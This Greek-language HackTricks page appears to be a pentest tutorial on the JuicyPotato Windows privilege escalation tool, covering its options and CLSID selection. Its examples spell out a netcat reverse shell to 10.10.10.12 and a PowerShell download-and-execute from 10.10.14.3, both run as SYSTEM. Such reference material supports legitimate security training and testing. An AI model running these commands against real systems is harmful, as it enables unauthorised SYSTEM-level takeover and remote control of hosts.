# JuicyPotato

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

{% hint style="warning" %}
**Το JuicyPotato δεν λειτουργεί** σε Windows Server 2019 και Windows 10 build 1809 και μετά. Ωστόσο, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) μπορούν να χρησιμοποιηθούν για **να εκμεταλλευτούν τα ίδια προνόμια και να αποκτήσουν πρόσβαση επιπέδου `NT AUTHORITY\SYSTEM`**. _**Δείτε:**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (κατάχρηση των χρυσών προνομίων) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Μια γλυκιά έκδοση του_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, με λίγο χυμό, δηλαδή **ένα άλλο εργαλείο Τοπικής Κατάχρησης Προνομίων, από Λογαριασμούς Υπηρεσιών Windows σε NT AUTHORITY\SYSTEM**_

#### Μπορείτε να κατεβάσετε το juicypotato από [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Περίληψη <a href="#summary" id="summary"></a>

[**Από το juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) και οι [παραλλαγές του](https://github.com/decoder-it/lonelypotato) εκμεταλλεύονται την αλυσίδα κατάχρησης προνομίων βασισμένη σε [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [υπηρεσία](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) έχοντας τον MiTM listener στο `127.0.0.1:6666` και όταν έχετε `SeImpersonate` ή `SeAssignPrimaryToken` προνόμια. Κατά τη διάρκεια μιας ανασκόπησης build Windows βρήκαμε μια ρύθμιση όπου το `BITS` είχε σκόπιμα απενεργοποιηθεί και η θύρα `6666` είχε καταληφθεί.

Αποφασίσαμε να οπλοποιήσουμε το [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Πείτε γεια στο Juicy Potato**.

> Για τη θεωρία, δείτε [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) και ακολουθήστε την αλυσίδα των συνδέσμων και αναφορών.

Ανακαλύψαμε ότι, εκτός από το `BITS`, υπάρχουν αρκετοί COM servers που μπορούμε να καταχραστούμε. Απλά χρειάζεται να:

1. είναι δυνατό να δημιουργηθούν από τον τρέχοντα χρήστη, συνήθως έναν “χρήστη υπηρεσίας” που έχει προνόμια κατάχρησης
2. να υλοποιούν τη διεπαφή `IMarshal`
3. να εκτελούνται ως ανυψωμένος χρήστης (SYSTEM, Administrator, …)

Μετά από κάποιες δοκιμές, αποκτήσαμε και δοκιμάσαμε μια εκτενή λίστα από [ενδιαφέροντα CLSID’s](http://ohpe.it/juicy-potato/CLSID/) σε πολλές εκδόσεις Windows.

### Juicy λεπτομέρειες <a href="#juicy-details" id="juicy-details"></a>

Το JuicyPotato σας επιτρέπει να:

* **Στόχος CLSID** _επιλέξτε οποιοδήποτε CLSID θέλετε._ [_Εδώ_](http://ohpe.it/juicy-potato/CLSID/) _μπορείτε να βρείτε τη λίστα οργανωμένη κατά OS._
* **Θύρα Listening COM** _ορίστε τη θύρα listening COM που προτιμάτε (αντί της σκληροκωδικοποιημένης 6666)_
* **Διεύθυνση IP Listening COM** _δεσμεύστε τον διακομιστή σε οποιαδήποτε IP_
* **Λειτουργία δημιουργίας διεργασίας** _ανάλογα με τα προνόμια του χρήστη που καταχράται μπορείτε να επιλέξετε από:_
* `CreateProcessWithToken` (χρειάζεται `SeImpersonate`)
* `CreateProcessAsUser` (χρειάζεται `SeAssignPrimaryToken`)
* `και τα δύο`
* **Διεργασία προς εκτέλεση** _εκκινήστε ένα εκτελέσιμο ή σενάριο αν η εκμετάλλευση είναι επιτυχής_
* **Επιχείρημα διεργασίας** _προσαρμόστε τα επιχειρήματα της εκτελούμενης διεργασίας_
* **Διεύθυνση διακομιστή RPC** _για μια κρυφή προσέγγιση μπορείτε να πιστοποιηθείτε σε έναν εξωτερικό διακομιστή RPC_
* **Θύρα διακομιστή RPC** _χρήσιμο αν θέλετε να πιστοποιηθείτε σε έναν εξωτερικό διακομιστή και το firewall μπλοκάρει τη θύρα `135`…_
* **ΛΕΙΤΟΥΡΓΙΑ ΔΟΚΙΜΗΣ** _κυρίως για δοκιμαστικούς σκοπούς, δηλαδή δοκιμή CLSIDs. Δημιουργεί το DCOM και εκτυπώνει τον χρήστη του token. Δείτε_ [_εδώ για δοκιμή_](http://ohpe.it/juicy-potato/Test/)

### Χρήση <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Τελικές σκέψεις <a href="#final-thoughts" id="final-thoughts"></a>

[**Από το juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Εάν ο χρήστης έχει δικαιώματα `SeImpersonate` ή `SeAssignPrimaryToken`, τότε είστε **SYSTEM**.

Είναι σχεδόν αδύνατο να αποτραπεί η κακή χρήση όλων αυτών των COM Servers. Μπορείτε να σκεφτείτε να τροποποιήσετε τα δικαιώματα αυτών των αντικειμένων μέσω του `DCOMCNFG`, αλλά καλή τύχη, αυτό θα είναι προκλητικό.

Η πραγματική λύση είναι να προστατεύσετε ευαίσθητους λογαριασμούς και εφαρμογές που εκτελούνται υπό τους λογαριασμούς `* SERVICE`. Η διακοπή του `DCOM` θα αναστείλει σίγουρα αυτή την εκμετάλλευση, αλλά θα μπορούσε να έχει σοβαρές επιπτώσεις στο υποκείμενο λειτουργικό σύστημα.

Από: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Παραδείγματα

Σημείωση: Επισκεφθείτε [αυτή τη σελίδα](https://ohpe.it/juicy-potato/CLSID/) για μια λίστα με CLSIDs που να δοκιμάσετε.

### Πάρτε ένα nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Εκκίνηση νέου CMD (αν έχετε πρόσβαση RDP)

![](<../../.gitbook/assets/image (300).png>)

## Προβλήματα CLSID

Συχνά, το προεπιλεγμένο CLSID που χρησιμοποιεί το JuicyPotato **δεν λειτουργεί** και η εκμετάλλευση αποτυγχάνει. Συνήθως, απαιτούνται πολλές προσπάθειες για να βρείτε ένα **λειτουργικό CLSID**. Για να αποκτήσετε μια λίστα με CLSIDs για να δοκιμάσετε για ένα συγκεκριμένο λειτουργικό σύστημα, θα πρέπει να επισκεφθείτε αυτή τη σελίδα:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **Έλεγχος CLSIDs**

Αρχικά, θα χρειαστείτε μερικά εκτελέσιμα αρχεία εκτός από το juicypotato.exe.

Κατεβάστε [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) και φορτώστε το στη συνεδρία PS σας, και κατεβάστε και εκτελέστε [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Αυτό το σενάριο θα δημιουργήσει μια λίστα με πιθανά CLSIDs για δοκιμή.

Στη συνέχεια, κατεβάστε [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(αλλάξτε τη διαδρομή στη λίστα CLSID και στο εκτελέσιμο juicypotato) και εκτελέστε το. Θα αρχίσει να δοκιμάζει κάθε CLSID, και **όταν αλλάξει ο αριθμός θύρας, θα σημαίνει ότι το CLSID λειτούργησε**.

**Ελέγξτε** τα λειτουργικά CLSIDs **χρησιμοποιώντας την παράμετρο -c**

## Αναφορές

* [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)


{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
